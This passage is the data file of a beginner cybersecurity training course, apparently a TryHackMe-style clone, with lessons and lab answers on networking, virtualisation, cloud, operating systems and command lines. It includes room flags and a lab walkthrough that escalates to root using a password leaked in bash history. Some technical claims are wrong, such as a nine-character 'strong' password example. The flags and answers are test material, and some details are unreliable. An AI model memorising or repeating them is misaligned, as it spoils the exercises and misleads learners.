              <tr><td><b>Port 22</b></td><td>SSH (Secure Shell)</td><td>Encrypted remote command-line administration</td></tr>
              <tr><td><b>Port 53</b></td><td>DNS (Domain Name System)</td><td>Resolves domain names to IP addresses</td></tr>
            </table>
            <p><b>Key Concepts:</b></p>
            <ul>
              <li><i>What do we use to identify a specific service on a server?</i> <b>Port</b></li>
              <li><i>What do we call the address of a server?</i> <b>Internet protocol address (IP Address)</b></li>
            </ul>`},

          {title:"Web Communication in Practice (URL Anatomy)", lab:true, notes:`
            <p>When interacting with web servers, clients use <b>Uniform Resource Locators (URLs)</b> to request specific web assets. Every URL contains distinct syntactic building blocks:</p>
            <pre><code>https://www.iamlearning.thm:443/contact?ref=blog#team
\\___/   \\________________/ \\__/ \\______/ \\______/ \\___/
  |             |            |     |        |       |
Scheme         Host        Port   Path    Query  Fragment</code></pre>
            <table>
              <tr><th>Component</th><th>Purpose</th><th>In Example URL: <code>https://www.iamlearning.thm/contact</code></th></tr>
              <tr><td><b>Scheme / Protocol</b></td><td>The communication protocol used to transfer data</td><td><code>https</code> (HTTP over TLS encryption)</td></tr>
              <tr><td><b>Host</b></td><td>The domain name or IP address of the target server</td><td><code>www.iamlearning.thm</code></td></tr>
              <tr><td><b>Path</b></td><td>The specific resource or file path requested on the server</td><td><code>/contact</code></td></tr>
            </table>
            <h3>Inspecting Live Network Packets</h3>
            <p>Using the browser Developer Tools <b>Network Tab</b>, we can observe the raw HTTP exchange:</p>
            <pre><code>GET /contact HTTP/1.1
Host: www.iamlearning.thm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 4820</code></pre>
            <p><b>Key Breakdown:</b></p>
            <ul>
              <li><i>Host:</i> <b>www.iamlearning.thm</b></li>
              <li><i>Scheme:</i> <b>https</b></li>
            </ul>`},

          {title:"Conclusion & Defensive Architecture", notes:`
            <p>Understanding client-server architectures highlights critical attack vectors and defense practices:</p>
            <ul>
              <li><b>Eavesdropping &amp; MitM:</b> If clients communicate with servers over unencrypted schemes (e.g. <code>http://</code>), attackers on the local Wi-Fi can sniff sensitive credentials and session cookies in cleartext. Always enforce HTTPS.</li>
              <li><b>Port Scanning:</b> Ethical hackers and adversaries scan target IP addresses using tools like <code>nmap</code> to discover open ports, revealing running services and outdated software versions susceptible to exploitation.</li>
              <li><b>Ingress Filtering:</b> Enterprise firewalls should close all unused listening ports, only permitting necessary traffic through strictly monitored reverse proxies.</li>
            </ul>`}
         ]},

        {name:"Virtualisation Basics", text:"Learn why virtualisation powers modern IT, improving efficiency and safely isolating environments.",
         icon:"📦", level:"easy", time:"25 min",
         tasks:[
          {title:"Why Virtualisation Matters", notes:`
            <p>In the early days of corporate IT, every application (mail server, database, accounting system) required its own physical bare-metal server chassis. This model was wildly inefficient: servers routinely ran at only 5% to 15% CPU utilization while consuming vast quantities of datacenter power and cooling.</p>
            <p><b>Virtualisation</b> revolutionized computing by enabling a single physical server to be partitioned into multiple completely isolated virtual computers called <b>Virtual Machines (VMs)</b>.</p>
            <h3>Core Terminology</h3>
            <ul>
              <li><b>Host Machine:</b> The physical computer containing physical CPU cores, RAM DIMMs, storage drives, and NICs.</li>
              <li><b>Guest Machine (VM):</b> The virtualized operating system running inside an isolated software container managed by virtualization software.</li>
              <li><b>Hypervisor (VMM):</b> The critical software layer (Virtual Machine Monitor) that abstracts physical hardware and allocates CPU cycles, RAM, and virtual disks to each guest OS.</li>
            </ul>`},

          {title:"The 10-Floor Building Analogy", notes:`
            <p>Virtualisation allows multiple operating systems with completely different environments (e.g. Windows Server, Ubuntu Linux, FreeBSD) to run concurrently on one physical machine without interfering with each other.</p>
            <h3>Analogy Breakdown</h3>
            <ul>
              <li><b>Physical Server (The Building):</b> The concrete structure, electrical grid, plumbing, and foundation.</li>
              <li><b>Hypervisor (The Building Manager):</b> Manages room allocations, utilities, security badges, and ensures no tenant breaches neighboring apartments.</li>
              <li><b>Virtual Machines (The Tenants):</b> Independent living spaces where residents (applications and guest operating systems) live autonomously without seeing inside each other's homes.</li>
            </ul>
            <p><b>Key Takeaways:</b></p>
            <ul>
              <li><i>What does virtualization enable multiple applications to share?</i> <b>Physical server</b></li>
              <li><i>What is the name of the software that manages resources for each VM?</i> <b>Hypervisor</b></li>
            </ul>`},

          {title:"Hypervisor Tiers (Type 1 vs Type 2 vs Containers)", notes:`
            <p>Virtualization technologies are categorized into distinct deployment tiers based on where the hypervisor operates:</p>
            ${hypervisorTypesSVG()}
            <h3>1. Type 1 Hypervisor (Bare-Metal)</h3>
            <p>The hypervisor software installs directly onto physical bare-metal hardware without any underlying operating system. Because there is no host OS overhead, Type 1 hypervisors deliver maximum performance, near-zero latency, and enterprise reliability (e.g. <b>VMware ESXi</b>, <b>Proxmox VE</b>, <b>Microsoft Hyper-V</b>).</p>

            <h3>2. Type 2 Hypervisor (Hosted)</h3>
            <p>The hypervisor runs as a standard software application on top of an existing host operating system (such as Windows, macOS, or Linux). While slightly slower than bare-metal, Type 2 hypervisors are user-friendly, inexpensive, and ideal for cyber security study labs and local testing (e.g. <b>Oracle VirtualBox</b>, <b>VMware Workstation</b>).</p>

            <h3>3. Containers (Docker / Podman)</h3>
            <p>Containers provide lightweight virtualization by sharing the host operating system's kernel while isolating user space processes. Unlike VMs, containers do not require running a full guest OS, enabling near-instant startup times and minimal RAM usage.</p>
            <p><b>Lab Practice Scenarios:</b></p>
            <ul>
              <li><i>Deploying a local practice lab on your laptop:</i> <b>Type 2 Hypervisor</b></li>
              <li><i>Hosting multiple microservices inside the same VM efficiently:</i> <b>Containers</b></li>
            </ul>`},

          {title:"Managing Virtual Machines (Telemetry & Troubleshooting)", lab:true, notes:`
            <p>In enterprise virtualization dashboards, engineers audit virtual infrastructure health and troubleshoot resource contention across cluster nodes (such as <code>HV-PROD-01</code> and <code>HV-PROD-02</code>).</p>
            <h3>Telemetry &amp; Audit Findings</h3>
            <ul>
              <li><b>Longest Uptime:</b> <code>Monitoring-SYS</code> had been running continuously without restart the longest.</li>
              <li><b>Highest Memory Consumption:</b> <code>DB-Cluster-01</code> consumed the largest memory allocation in the pool.</li>
              <li><b>Host Load Distribution:</b> <code>HV-PROD-02</code> hosted the majority of active production workloads.</li>
              <li><b>Troubleshooting VM Outages:</b> Fixing a crashed virtual network adapter and rebooting <code>Mail-SERVER</code> restored connectivity, bringing the fleet total to <b>8 running VMs</b>.</li>
            </ul>`},

          {title:"Virtualization in Cyber Security", notes:`
            <p>Virtualization is an indispensable tool across every cybersecurity discipline:</p>
            <ul>
              <li><b>Safe Malware Detonation:</b> Security researchers execute untrusted trojans inside disposable VMs. If malware destroys files or encrypts disks, the researcher simply reverts to a clean <b>snapshot</b> with a single click.</li>
              <li><b>Virtual Machine Escape:</b> A critical vulnerability where malicious code breaks out of the guest VM and executes arbitrary code directly inside the hypervisor, gaining control over all neighboring tenant VMs.</li>
              <li><b>Lab Isolation:</b> Penetration testers practice offensive techniques against vulnerable victim VMs without risking damage to their physical host network.</li>
            </ul>`}
         ]},

        {name:"Cloud Computing Fundamentals", text:"Discover how cloud computing helps businesses move faster, do more, and scale with less effort.",
         icon:"☁️", level:"easy", time:"25 min",
         tasks:[
          {title:"What is Cloud Computing?", notes:`
            <p><b>Cloud Computing</b> is the on-demand delivery of IT resources—servers, storage, databases, networking, and software—over the internet with pay-as-you-go pricing.</p>
            <p>Rather than purchasing physical servers and renting datacenter space, organizations provision computing power in seconds from hyperscale cloud providers such as <b>Amazon Web Services (AWS)</b>, <b>Microsoft Azure</b>, and <b>Google Cloud Platform (GCP)</b>.</p>
            <h3>Key Benefits</h3>
            <ul>
              <li><b>Zero Capital Expenditure (CapEx):</b> No need to purchase upfront server racks or backup generators.</li>
              <li><b>Instant Elasticity:</b> Spin up hundreds of servers in minutes to handle sudden demand spikes, then terminate them when done.</li>
              <li><b>Global Reach:</b> Deploy workloads closer to users across worldwide regions in seconds.</li>
            </ul>`},

          {title:"Cloud Service Models (IaaS vs PaaS vs SaaS)", notes:`
            <h3>The 3 Core Cloud Service Models</h3>
            ${cloudModelsSVG()}
            <table>
              <tr><th>Service Model</th><th>Apartment Analogy</th><th>What It Delivers</th><th>Who Manages What</th><th>Common Examples</th></tr>
              <tr><td><b>IaaS (Infrastructure as a Service)</b></td><td>Unfurnished Apartment</td><td>Raw computing infrastructure: virtual servers, block storage, and virtual private clouds (VPCs).</td><td>Provider manages physical hardware; you configure OS, runtime, and applications.</td><td>AWS EC2, Azure VMs, Google Compute Engine</td></tr>
              <tr><td><b>PaaS (Platform as a Service)</b></td><td>Furnished Apartment</td><td>Development platform where developers deploy application code without managing underlying OS or servers.</td><td>Provider manages OS, patches, scaling, and hardware; you focus strictly on application code.</td><td>AWS Elastic Beanstalk, Heroku, Google App Engine</td></tr>
              <tr><td><b>SaaS (Software as a Service)</b></td><td>Hotel Suite</td><td>Complete end-user applications delivered over web browsers.</td><td>Provider manages everything from infrastructure to application logic.</td><td>Microsoft 365, Google Workspace, Salesforce</td></tr>
            </table>

            <h3>Cloud Deployment Models</h3>
            <ul>
              <li><b>Public Cloud:</b> Multi-tenant cloud infrastructure owned and operated by third-party providers, accessible over the public internet. The most common deployment model.</li>
              <li><b>Private Cloud:</b> Dedicated cloud infrastructure used exclusively by a single enterprise, often hosted in an on-premises datacenter.</li>
              <li><b>Hybrid Cloud:</b> Seamlessly connects on-premises private infrastructure with public cloud platforms, allowing data and workloads to move between them.</li>
            </ul>
            <h3>Elasticity vs Scalability</h3>
            <p><b>Scalability</b> is the ability to handle long-term growth in data and traffic, while <b>Elasticity</b> is the ability to automatically expand and contract computing resources in real time to match immediate demand spikes.</p>`},

          {title:"Cloud Economics & Resource Management", lab:true, notes:`
            <p>In cloud management consoles, optimizing resource consumption and shutting down idle workloads directly cuts monthly credit costs:</p>
            <h3>Instance Cost Metrics</h3>
            <ul>
              <li><b>Instance Provisioning:</b> A standard compute-optimized <code>m5.large</code> EC2 instance costs <b>70 credits per month</b>.</li>
              <li><b>Optimizing Idle Environments:</b> Stopping non-essential development instances (such as <code>study-machine-1</code> and <code>study-machine-2</code>) brings baseline infrastructure cost down to <b>30 credits per month</b>.</li>
            </ul>`},

          {title:"Cloud Security & Shared Responsibility Model", notes:`
            <p>The foundational security principle of modern cloud architecture is the <b>Shared Responsibility Model</b>:</p>
            <ul>
              <li><b>Security OF the Cloud (Provider Responsibility):</b> The cloud provider is strictly responsible for protecting physical datacenters, biometric entry controls, diesel generators, cabling, and the underlying hypervisor.</li>
              <li><b>Security IN the Cloud (Customer Responsibility):</b> The customer is responsible for configuring access permissions (IAM), encrypting database storage, setting firewall rules (Security Groups), and applying operating system security patches.</li>
            </ul>
            <p class="callout"><b>Common Cloud Misconfigurations:</b> Most cloud data breaches are not caused by flaws in AWS or Azure hardware, but by customer misconfigurations—such as publicly accessible S3 storage buckets, overly permissive root credentials, and hardcoded API secret keys pushed to GitHub repositories.</p>`}
         ]},
       ]},
      {icon:"⚙️", title:"Operating Systems Basics", text:"Learn the fundamentals of operating systems and how users interact with Windows and Linux through graphical and command line interfaces.",
       intro:"Every device you use runs an operating system, it's the layer between you and the hardware. In this module, you’ll explore what an operating system is, its core duties, and common use cases. You will then focus on practical interaction with Windows through its graphical user interface, before moving to Linux and Windows command line environments to navigate and read files, and collect basic system information.",
       rooms:[
        {name:"Operating Systems: Introduction", icon:"⚙️", text:"Explore the basics of operating systems and the core features that power your computer.",
         level:"easy", time:"25 min",
         tasks:[
          {title:"The Master Software Bridge", notes:`
            <p>Every device you interact with—whether a laptop, gaming console, smartphone, or cloud server—runs an <b>Operating System (OS)</b>. The OS is the foundational master control program mediating all communication between application software and physical hardware.</p>
            <p>Without an operating system, developers would have to write custom binary drivers for every individual motherboard chipset, graphics card, and storage controller just to display a line of text on screen.</p>`},

          {title:"Kernel Space vs User Space", notes:`
            <p>To provide security, stability, and resource protection, modern operating systems enforce a strict architectural divide between privileged and non-privileged execution:</p>
            ${osArchitectureSVG()}
            <h3>Air Traffic Control Analogy</h3>
            <p>Think of an airport: the airplanes are applications, the runways and radar systems are computer hardware, and the <b>Air Traffic Controller</b> is the operating system kernel. Without central coordination, planes would collide on the tarmac and overwhelm the airspace.</p>
            <h3>1. Kernel Space (Ring 0)</h3>
            <p>The <b>Kernel</b> is the core engine of the operating system that resides permanently in memory from the moment the computer boots. Running with unrestricted hardware access in CPU execution <b>Ring 0</b>, the kernel oversees five critical responsibilities:</p>
            <ul>
              <li><b>Process Management:</b> The CPU scheduler allocates microsecond time-slices across hundreds of competing threads, preventing rogue programs from freezing the machine.</li>
              <li><b>Memory Management:</b> Allocates isolated virtual address spaces for each process, ensuring one application cannot read or overwrite another process's RAM.</li>
              <li><b>File System Management:</b> Organizes data on storage drives using hierarchical file systems (NTFS, ext4, APFS).</li>
              <li><b>Device Driver Control:</b> Translates standardized I/O requests into hardware-specific signals for network cards, USB ports, and GPUs.</li>
              <li><b>User Management &amp; Access Control:</b> Enforces user authentication, group privileges, and file permissions.</li>
            </ul>

            <h3>2. User Space (Ring 3)</h3>
            <p>Applications (web browsers, text editors, games, command prompts) execute in restricted <b>User Space (Ring 3)</b>. To read a file or send network packets, user applications must request assistance from the kernel via a <b>System Call (syscall)</b>.</p>

            <h3>Key Architectural Takeaways:</h3>
            <ul>
              <li><i>Which OS space has unrestricted access to your computer's hardware?</i> <b>Kernel Space (Ring 0)</b></li>
              <li><i>Which OS responsibility manages user accounts, authentication, and permissions?</i> <b>User Management</b></li>
            </ul>`},

          {title:"GUI vs CLI & Lab Exploration", lab:true, notes:`
            <p>Operating systems deliver user interfaces through two primary paradigms:</p>
            <ul>
              <li><b>Graphical User Interface (GUI):</b> Windows, icons, menus, and pointers (WIMP) designed for intuitive mouse and touch navigation.</li>
              <li><b>Command-Line Interface (CLI):</b> Text-based terminals designed for precision control, automation, and remote headless server administration.</li>
            </ul>
            <h3>Lab System Telemetry &amp; File Hunt</h3>
            <ul>
              <li><b>OS Distribution &amp; Version:</b> Ubuntu MATE <code>1.26.2</code></li>
              <li><b>RAM Allocation:</b> <code>1.9 GiB</code> physical memory allocated</li>
              <li><b>Storage Volume:</b> <b>9.1 GB</b> available disk space on root volume (filesystem: <code>ext4</code>)</li>
              <li><b>User Directory Audit:</b> <code>/home</code> contains <b>3 user directories</b> (<code>alex</code>, <code>guest</code>, <code>ubuntu</code>).</li>
              <li><b>Found Note Flag:</b> Inside <code>/home/alex/Documents/note.txt</code>:</li>
            </ul>
            <p class="callout"><b>Room Flag:</b> <code>THM{new_pc_for_free!}</code></p>`},

          {title:"Security Architecture & Privilege Boundaries", notes:`
            <p>Understanding kernel versus user space isolation is crucial for cyber security defenders and penetration testers alike:</p>
            <ul>
              <li><b>Privilege Escalation:</b> When attackers compromise a web application, they land in restricted User Space. Their immediate objective is to find a kernel exploit or misconfigured service to break into Kernel Space / Root.</li>
              <li><b>Principle of Least Privilege:</b> Organizations should never allow everyday users to run daily office tasks under Administrator / root privileges, as any malware executed automatically inherits full kernel access.</li>
              <li><b>System Call Auditing:</b> Modern EDR (Endpoint Detection and Response) agents hook into system calls to detect process injection, privilege escalation, and suspicious root activity.</li>
            </ul>`}
         ]},

        {name:"Windows Basics", icon:"🪟", text:"Learn to navigate Windows, manage files, and use essential system tools.",
         level:"easy", time:"25 min",
         tasks:[
          {title:"Windows Enterprise Architecture", notes:`
            <p><b>Microsoft Windows</b> is the dominant desktop operating system globally, powering over 70% of enterprise workstations and corporate Active Directory networks. For security analysts and IT administrators, understanding the Windows architecture and its core administrative tools is essential.</p>
            <h3>Core Windows Management Utilities</h3>
            <ul>
              <li><b>File Explorer:</b> Navigates drive structures, file properties, and hidden folders.</li>
              <li><b>Task Manager:</b> Displays real-time CPU, RAM, and disk utilization, along with running background processes and startup services.</li>
              <li><b>Services Console (services.msc):</b> Manages background Windows daemons and services.</li>
              <li><b>Windows Registry (regedit):</b> The hierarchical central database storing all low-level system, hardware, and user configuration settings.</li>
            </ul>`},

          {title:"Workspace Navigation & System Telemetry", notes:`
            <p>In enterprise Windows workstations, administrators and analysts navigate through 8 primary interface components:</p>
            <h3>Desktop Workspace Navigation (Callouts 1–8)</h3>
            <ul>
              <li><b>1. Start Menu:</b> Central hub to search and launch applications, manage power states, and access settings.</li>
              <li><b>2. Search Bar:</b> Instant indexing across local drives, programs, and system settings.</li>
              <li><b>3. Taskbar &amp; Pinned Apps:</b> Quick launcher for daily tools like File Explorer and Edge.</li>
              <li><b>4. System Tray / Notification Area:</b> Displays background icons (volume, network status, antivirus).</li>
              <li><b>5. Action Center:</b> Unified hub for notifications and quick hardware toggles.</li>
              <li><b>6. File Explorer:</b> Windows file manager organizing local drives and mapped network shares.</li>
              <li><b>7. Quick Access:</b> Pinned favorites and recently accessed project directories.</li>
              <li><b>8. System Specifications:</b> Detailed hardware and build information in Settings.</li>
            </ul>
            <h3>Workstation Audit Findings</h3>
            <ul>
              <li><b>Device Name:</b> <code>TryHatMe</code></li>
              <li><b>Installed RAM:</b> <code>4.00 GB</code></li>
              <li><b>OS Version:</b> Windows Server 2019 Datacenter version <code>1809</code></li>
              <li><b>Onboarding Flag:</b> Located in <code>C:\\Users\\Administrator\\Desktop\\TryHatMe Onboarding\\Welcome.txt</code>:</li>
            </ul>
            <p class="callout"><b>Room Flag:</b> <code>THM{welcome_to_tryhatme!}</code></p>`},

          {title:"Application Management & Security Scans", lab:true, notes:`
            <p>Practical Windows administration involves verifying software provenance, monitoring hardware loads, and validating endpoint antivirus defenses:</p>
            <h3>Execution &amp; Telemetry Auditing</h3>
            <ul>
              <li><b>Installer Execution:</b> Executing <code>TryHatMeWelcome.exe</code> in the onboarding directory completes setup and yields flag: <code>THM{your_first_day!}</code>.</li>
              <li><b>Workstation Locale:</b> Time &amp; Language configured for <b>United States</b>.</li>
              <li><b>CPU Base Frequency:</b> Task Manager Performance tab indicates a CPU clock speed of <b>2.20 GHz</b>.</li>
              <li><b>Antivirus Verification:</b> Scanning downloaded test files with Windows Defender detects the industry-standard verification signature: <code>Virus:DOS/EICAR_Test_File</code>.</li>
            </ul>
            <p class="callout"><b>Room Flag:</b> <code>THM{your_first_day!}</code></p>`},

          {title:"Windows Security & Defense-in-Depth", notes:`
            <p>Maintaining security across enterprise Windows environments requires defense-in-depth:</p>
            <ul>
              <li><b>Windows Event Viewer (eventvwr.msc):</b> Security event logs capture critical authentication audits:
                <ul>
                  <li><code>Event ID 4624</code>: Successful account logon</li>
                  <li><code>Event ID 4625</code>: Failed logon attempt (brute-force detection)</li>
                  <li><code>Event ID 4720</code>: New user account created</li>
                </ul>
              </li>
              <li><b>User Account Control (UAC):</b> Prompts administrative confirmation before applications can execute privileged actions in Ring 0 / Kernel mode.</li>
              <li><b>BitLocker Drive Encryption:</b> Encrypts full disk volumes using hardware TPM (Trusted Platform Module) chips, protecting confidential data against stolen laptops.</li>
              <li><b>Patch Management:</b> Enforcing monthly Windows Update cycles ("Patch Tuesday") to remediate critical remote code execution (RCE) vulnerabilities.</li>
            </ul>`}
         ]},

        {name:"Linux CLI Basics", icon:"🐧", text:"Get comfortable navigating through the Linux CLI.",
         level:"easy", time:"30 min",
         tasks:[
          {title:"Introduction to the Linux CLI", notes:`
            <p>The <b>Linux Command Line Interface (CLI)</b> is the undisputed backbone of cybersecurity. Security distributions like Kali Linux and Parrot OS, cloud virtual instances, enterprise database engines, web servers, and firewalls are almost universally powered by Linux.</p>
            <p>Interacting through a text shell (such as <code>bash</code> or <code>zsh</code>) enables security engineers to rapidly filter gigabytes of logs, chain utilities together with pipes (<code>|</code>), and manage remote systems securely across encrypted SSH connections.</p>
            <p><b>Core Concept:</b> CLI stands for <b>Command-Line Interface</b>.</p>`},

          {title:"Navigation Mission: \"Find the Missing Notes\"", lab:true, notes:`
            <p>Unlike Windows drive letters (<code>C:\\</code>, <code>D:\\</code>), Linux organizes all physical drives, devices, and filesystems into a single inverted hierarchical tree starting at the root directory: <code>/</code>.</p>
            ${linuxFileTreeSVG()}
            <h3>Core Navigation Commands</h3>
            <ul>
              <li><code>pwd</code> (Print Working Directory): Displays your current directory path.</li>
              <li><code>ls -la</code>: Lists all files in the current folder, including hidden files (prefixed with a dot <code>.</code>) and permission bits.</li>
              <li><code>cd &lt;dir&gt;</code>: Changes the active working directory.</li>
              <li><code>cat &lt;file&gt;</code>: Concatenates and prints file contents to the screen.</li>
              <li><code>find &lt;path&gt; -name &lt;pattern&gt;</code>: Recursively searches directories for matching filenames.</li>
            </ul>
            <h3>Terminal Mission Execution</h3>
            <pre><code>ubuntu@thm:~$ find /home/ubuntu -name "mission_brief.txt"
/home/ubuntu/Documents/.research/archive/mission_brief.txt

ubuntu@thm:~$ cat /home/ubuntu/Documents/.research/archive/mission_brief.txt
MISSION-FOUND</code></pre>
            <p class="callout"><b>Room Flag:</b> <code>MISSION-FOUND</code></p>`},

          {title:"Investigating the System", lab:true, notes:`
            <p>When an incident responder or penetration tester lands on a Linux system, their immediate first phase is <b>Local System Enumeration</b>.</p>
            <h3>Essential Linux Enumeration Commands</h3>
            <pre><code>ubuntu@thm:~$ whoami
ubuntu

ubuntu@thm:~$ uname -a
Linux ip-10-10-14-22 6.14.0-1018-aws #18-Ubuntu SMP Thu Jan 15 2026 x86_64 GNU/Linux

ubuntu@thm:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/root        79G   17G   58G  23% /

ubuntu@thm:~$ cat day1_report.txt
END-OF-DAY1</code></pre>
            <h3>Enumeration Telemetry:</h3>
            <ul>
              <li><b>Current User:</b> <code>ubuntu</code></li>
              <li><b>Kernel Version:</b> <code>6.14.0-1018-aws</code></li>
              <li><b>Free Disk Quota:</b> <code>58G</code> available</li>
            </ul>
            <p class="callout"><b>Room Flag:</b> <code>END-OF-DAY1</code></p>`},

          {title:"Unix Pipelines & Threat Hunting", notes:`
            <p>The true power of the Linux CLI lies in the Unix philosophy: small, modular tools that each do one thing well, combined using redirection and pipelines:</p>
            <ul>
              <li><code>grep "Failed password" /var/log/auth.log</code>: Instantly filters SSH brute-force attempts from authentication logs.</li>
              <li><code>ps aux | grep nginx</code>: Checks if the Nginx web server daemon is active.</li>
              <li><code>cat access.log | cut -d' ' -f1 | sort | uniq -c | sort -nr</code>: Tallies the top IP addresses sending requests to a server to spot DDoS or crawler sources.</li>
            </ul>`}
         ]},

        {name:"Windows CLI Basics", icon:"⌨️", text:"Explore what Windows CLI is, how to navigate, and interact with the system using Windows CLI.",
         level:"easy", time:"25 min",
         tasks:[
          {title:"Command Prompt vs PowerShell", notes:`
            <p>While Windows is famous for its graphical desktop, professional system administrators, incident response teams, and penetration testers interact heavily with the Windows command line.</p>
            <p>Windows provides two primary command-line environments:</p>
            <ul>
              <li><b>Command Prompt (cmd.exe):</b> The legacy text interpreter providing backward compatibility with MS-DOS commands.</li>
              <li><b>PowerShell (powershell.exe / pwsh):</b> A modern, object-oriented shell and scripting language built on the .NET runtime, allowing programmatic manipulation of Windows objects rather than plain text.</li>
            </ul>`},

          {title:"Navigating Files and Recursive Search", lab:true, notes:`
            <p>Windows file paths use drive letters (e.g. <code>C:\\</code>) and backslashes (<code>\\</code>) to separate directory names.</p>
            <h3>Command Prompt Equivalents</h3>
            <table>
              <tr><th>Command Prompt (CMD)</th><th>Linux Equivalent</th><th>Purpose</th></tr>
              <tr><td><code>dir</code></td><td><code>ls</code></td><td>Displays directory contents</td></tr>
              <tr><td><code>cd</code></td><td><code>cd</code></td><td>Changes current directory</td></tr>
              <tr><td><code>type &lt;file&gt;</code></td><td><code>cat</code></td><td>Prints file contents to console</td></tr>
              <tr><td><code>cls</code></td><td><code>clear</code></td><td>Clears the terminal screen</td></tr>
              <tr><td><code>copy</code> / <code>move</code></td><td><code>cp</code> / <code>mv</code></td><td>Copies or moves files</td></tr>
            </table>
            <h3>Searching Across Nested Folders</h3>
            <pre><code>C:\\Users\\Administrator&gt; dir /s /b task_brief.txt
C:\\Users\\Administrator\\Documents\\Notes\\research_yn6\\exports_imv\\screenshots\\notes_wi6\\task_brief.txt

C:\\Users\\Administrator&gt; type C:\\Users\\Administrator\\Documents\\Notes\\research_yn6\\exports_imv\\screenshots\\notes_wi6\\task_brief.txt
TASK-BRIEF-FOUND</code></pre>
            <p class="callout"><b>Room Flag:</b> <code>TASK-BRIEF-FOUND</code></p>`},

          {title:"Gathering System Information on Windows", notes:`
            <p>Windows CLI commands provide immediate visibility into system architecture, active networking sockets, and user privileges:</p>
            <ul>
              <li><code>hostname</code>: Displays the local computer name (e.g. <code>TryHatMe-WS</code>).</li>
              <li><code>systeminfo</code>: Displays comprehensive operating system build details, hotfix patches, memory capacity, and domain controller information.</li>
              <li><code>whoami /priv</code>: Enumerates security privileges assigned to your current Windows logon token (such as <code>SeDebugPrivilege</code> or <code>SeImpersonatePrivilege</code>).</li>
              <li><code>net user</code>: Lists all local user accounts registered on the system.</li>
              <li><code>ipconfig /all</code>: Details all network adapters, IPv4/IPv6 addresses, subnet masks, default gateways, and DNS resolvers.</li>
            </ul>`},

          {title:"PowerShell Automation & Administration", notes:`
            <p>PowerShell cmdlets (structured as <code>Verb-Noun</code>) provide powerful administration and security investigation capabilities:</p>
            <pre><code>PS C:\\&gt; Get-Service | Where-Object {$_.Status -eq "Running"}
PS C:\\&gt; Get-Process | Sort-Object CPU -Descending | Select-Object -First 5
PS C:\\&gt; Test-NetConnection -ComputerName 10.10.10.10 -Port 80</code></pre>`}
         ]},

        {name:"Operating System Security", icon:"🔑", text:"This room introduces users to operating system security and demonstrates SSH authentication on Linux.",
         level:"easy", time:"30 min",
         tasks:[
          {title:"The Computing Stack & CIA Triad", notes:`
            <p>An operating system is only as secure as its configuration. Even the most advanced kernel architecture can be compromised in seconds if administrators configure weak credentials, leave insecure network services running, or fail to enforce access controls.</p>
            <h3>The Computing Hierarchy</h3>
            <p>Software security relies on a layered foundation: <b>Physical Hardware &rarr; Operating System &rarr; Applications</b>. If the OS layer is compromised, every application and database running on top of it is vulnerable.</p>
            <h3>CIA Triad in Operating System Security</h3>
            <ul>
              <li><b>Confidentiality:</b> Ensuring files and process memory can only be accessed by authorized user accounts and groups (file permissions, BitLocker, LUKS disk encryption).</li>
              <li><b>Integrity:</b> Preventing unauthorized modification of system executables and configurations (digital code signatures, system file integrity checkers).</li>
              <li><b>Availability:</b> Ensuring system resources remain accessible to legitimate users (DoS mitigation, swap space quotas, process limits).</li>
            </ul>
            <p><b>Note:</b> Applications like <b>Thunderbird</b> (an email client) are user-space software applications, not operating systems.</p>`},

          {title:"Authentication & Password Security", notes:`
            <p>The foundational line of defense in modern operating systems is <b>Authentication and Password Security</b>.</p>
            <h3>The Three Pillars of Authentication</h3>
            <ul>
              <li><b>Something you know:</b> Passwords, passphrases, PIN codes.</li>
              <li><b>Something you have:</b> Hardware security keys (YubiKey), smartphone authenticator apps (TOTP), smartcards.</li>
              <li><b>Something you are:</b> Biometrics (fingerprints, facial recognition, iris scans).</li>
            </ul>
            <h3>Password Entropy &amp; Cracking Defenses</h3>
            <p>Adversaries use automated password cracking tools (like Hashcat and John the Ripper) alongside massive wordlists (such as <code>rockyou.txt</code> containing millions of real leaked passwords) to crack weak passwords in seconds.</p>
            <ul>
              <li>Weak passwords like <code>123456</code>, <code>password</code>, <code>qwerty</code>, and <code>abc123</code> are checked in microseconds by dictionary attacks and keyboard walk pattern matchers.</li>
              <li>Strong passwords combine length (14+ characters), alphanumeric entropy, uppercase and lowercase characters, and symbols (e.g. <code>LearnM00r</code>).</li>
            </ul>`},

          {title:"SSH Authentication & Privilege Escalation Lab", lab:true, notes:`
            <p>In this hands-on lab, we connect to a target Linux server via <b>SSH (Secure Shell)</b> to test authentication hygiene and audit command histories for credential leakage.</p>
            <h3>Phase 1: SSH Login as Sammie &amp; Su to Johnny</h3>
            <p>Logging into the machine as user <code>sammie</code> with password <code>dragon</code>:</p>
            <pre><code>$ ssh sammie@10.10.14.22
sammie@10.10.14.22's password: [dragon]
sammie@thm-os:~$ su - johnny
Password: [abc123]
johnny@thm-os:~$</code></pre>

            <h3>Phase 2: Auditing Command History for Leaked Credentials</h3>
            <p>Users frequently make accidental typos in the terminal. Checking Johnny's command history reveals a critical blunder:</p>
            <pre><code>johnny@thm-os:~$ history
1  ls -la
2  cd /var/www
3  happyHack!NG
4  clear
5  exit</code></pre>
            <p>Johnny mistakenly pasted the administrative <b>root password</b> directly into the bash prompt instead of a command, permanently recording <code>happyHack!NG</code> in plain text into his <code>~/.bash_history</code> file!</p>

            <h3>Phase 3: Elevating to Root Access</h3>
            <pre><code>johnny@thm-os:~$ su - root
Password: [happyHack!NG]
root@thm-os:~# whoami
root
root@thm-os:~# cat /root/flag.txt
THM{YouGotRoot}</code></pre>
            <p class="callout"><b>Room Flag:</b> <code>THM{YouGotRoot}</code></p>`},

          {title:"Hardening Operating Systems", notes:`
            <p>How do security administrators defend against credential harvesting and unauthorized access?</p>
            <ul>
              <li><b>Disable Root Remote Login:</b> Configure <code>/etc/ssh/sshd_config</code> with <code>PermitRootLogin no</code>, forcing administrators to log in as named accounts with SSH keys before elevating.</li>
              <li><b>Enforce Multi-Factor Authentication (MFA):</b> Require TOTP hardware or authenticator tokens alongside passwords.</li>
              <li><b>History Sanitization &amp; File Permissions:</b> Restrict file permissions on history files (<code>chmod 600 ~/.bash_history</code>) or configure <code>HISTCONTROL=ignorespace</code> to prevent logging sensitive inputs.</li>
              <li><b>Account Lockout Policies:</b> Implement tools like <code>fail2ban</code> to automatically block IP addresses after 3–5 failed SSH authentication attempts.</li>
            </ul>`}
         ]}
       ]},
